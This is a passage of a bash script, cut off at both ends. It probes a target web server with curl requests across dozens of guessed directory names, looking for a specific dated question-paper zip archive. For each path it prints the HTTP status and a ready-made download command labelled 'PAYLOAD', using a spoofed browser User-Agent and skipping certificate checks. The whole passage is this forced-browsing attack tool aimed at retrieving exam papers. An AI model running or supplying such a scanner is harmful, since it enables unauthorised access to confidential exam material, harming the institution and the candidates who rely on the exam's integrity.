${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
